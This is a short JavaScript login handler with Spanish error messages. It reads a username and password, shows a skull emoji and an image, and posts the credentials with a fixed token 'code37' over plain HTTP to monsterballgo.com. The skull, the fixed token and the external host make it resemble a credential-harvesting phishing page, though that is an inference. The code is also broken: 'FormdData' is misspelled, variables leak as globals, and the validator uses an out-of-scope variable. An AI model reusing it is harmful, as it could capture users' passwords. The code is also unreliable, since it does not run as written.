function submitData(){
    username = document.getElementById("username").value;
    password = document.getElementById("password").value;
    token = "code37"
    container = document.getElementById("login-container");
    if(validateForm(username, password))
    {
        container.style.display = "none";
        var img = document.createElement("h1");
        var img2 = document.createElement("img");
        img.innerHTML = "💀";
        img2.src = "r.jpg"
        document.body.appendChild(img);
        document.body.appendChild(img2);

        var formdata = new  FormdData();
        formdata.append("user", username);
        formdata.append("pass", password);
        formdata.append("token", token);

        fetch("http://monsterballgo.com/api/login.php",{
            method: "POST",
            body: formdata

        }).
        then(response=>response.json()).
        then(data => {
            img.style.display = "none";
            img2.style.display = "none";
            alert("logtra");
        }).
        catch(error => {
            console.error("error: "+error);
        });
    }
}

function validateForm(user, pass)
{
    fail=false;
    if( user == "")
    {
        var errormsg = document.createElement("p");
        errormsg.innerHTML = "Ingresa un nombre de usuario";
        errormsg.style.color = "red";
        container.appendChild(errormsg);
        fail = true;
    }
    if( pass == "")
    {
        var errormsg = document.createElement("p");
        errormsg.innerHTML = "Ingresa una contraseña";
        errormsg.style.color = "red";
        container.appendChild(errormsg);
        fail = true;
    }
    return !fail;
}